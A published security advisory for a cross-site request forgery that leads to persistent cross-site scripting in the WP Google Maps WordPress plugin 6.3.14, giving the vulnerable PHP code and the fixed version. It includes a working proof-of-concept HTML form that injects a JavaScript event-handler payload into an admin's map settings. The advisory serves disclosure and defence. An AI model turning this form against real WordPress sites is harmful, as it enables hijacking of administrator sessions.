@@ -1,0 +1,87 @@
+id: 26313
+date: 11/12/2016
+title: WordPress Google Maps 6.3.14 Cross Site Request Forgery Vulnerability
+author: Sipke Mellema
+cves: 
+
+------------------------------------------------------------------------
+Persistent Cross-Site Scripting in WP Google Maps Plugin via CSRF
+------------------------------------------------------------------------
+Sipke Mellema, July 2016
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A persistent Cross-Site Scripting vulnerability was found in the WP
+Google Maps Plugin. This issue allows an attacker to perform a wide
+variety of actions, such as stealing Administrators' session tokens, or
+performing arbitrary actions on their behalf. In order to exploit this
+issue, the attacker has to lure/force a logged on WordPress
+Administrator into opening a URL provided by an attacker.
+
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160724-0007
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on the WP Google Maps WordPress
+Plugin version 6.3.14.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+This issue is resolved in WP Google Maps WordPress Plugin version
+6.3.15.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_wp_google_maps_plugin_via_csrf.html
+
+
+The issue exists in the file wpGoogleMaps.php and is caused by the lack of output encoding on the wpgmza_store_locator_query_string request parameter. The parameter is sanitized with sanitize_text_field, which will encode characters for usage in HTML context. However, the parameter is used in JavaScript context, allowing for Cross-Site Scripting. The vulnerable code is listed below.
+
+$other_settings['store_locator_query_string'] = sanitize_text_field($_POST['wpgmza_store_locator_query_string']);
+if (isset($_POST['wpgmza_store_locator_restrict'])) { $other_settings['wpgmza_store_locator_restrict'] = sanitize_text_field($_POST['wpgmza_store_locator_restrict']); }
+[..]
+if (isset($map_other_settings['wpgmza_store_locator_restrict'])) { $restrict_search = $map_other_settings['wpgmza_store_locator_restrict']; } else { $restrict_search = false; }
+[..]
+{ types: ['geocode'], componentRestrictions: {country: '<?php echo $restrict_search; ?>'} });
+
+Proof of Concept
+
+Have an authenticated admin visit a webpage with the following form:
+
+<html>
+   <body>
+      <form action="http://<wordpress site>/wp-admin/admin.php?page=wp-google-maps-menu&action=edit&map_id=1" method="POST">
+         <input type="hidden" name="wpgmza_id" value="1" />
+         <input type="hidden" name="wpgmza_start_location" value="45.950464398418106,-109.81550500000003" />
+         <input type="hidden" name="wpgmza_start_zoom" value="2" />
+         <input type="hidden" name="wpgmza_title" value="My first map" />
+         <input type="hidden" name="wpgmza_width" value="100" />
+         <input type="hidden" name="wpgmza_map_width_type" value="%" />
+         <input type="hidden" name="wpgmza_height" value="400" />
+         <input type="hidden" name="wpgmza_map_height_type" value="px" />
+         <input type="hidden" name="wpgmza_map_align" value="1" />
+         <input type="hidden" name="wpgmza_map_type" value="1" />
+         <input type="hidden" name="wpgmza_theme_data_0" value="" />
+         <input type="hidden" name="wpgmza_store_locator_restrict" value="ad" />
+         <input type="hidden" name="wpgmza_store_locator_query_string" value=":i8gr4"onfocus="alert(1)"autofocus="" />
+         <input type="hidden" name="wpgmza_store_locator_bounce" value="on" />
+         <input type="hidden" name="wpgmza_max_zoom" value="1" />
+         <input type="hidden" name="wpgmza_savemap" value="Save Map i?1/2»" />
+         <input type="hidden" name="wpgmza_edit_id" value="" />
+         <input type="hidden" name="wpgmza_animation" value="0" />
+         <input type="hidden" name="wpgmza_infoopen" value="0" />
+         <input type="submit" value="Submit request" />
+      </form>
+   </body>
+</html>
+
+When the form is submitted (or auto-submitted), a popup box will appear, which means that the JavaScript from the parameter wpgmza_store_locator_query_string is executed in the admin's browser. The JavaScript will run every time the map (with id 1 in this case) is viewed/edited by an admin.
+
+#  0day.today [2023-03-26]  #
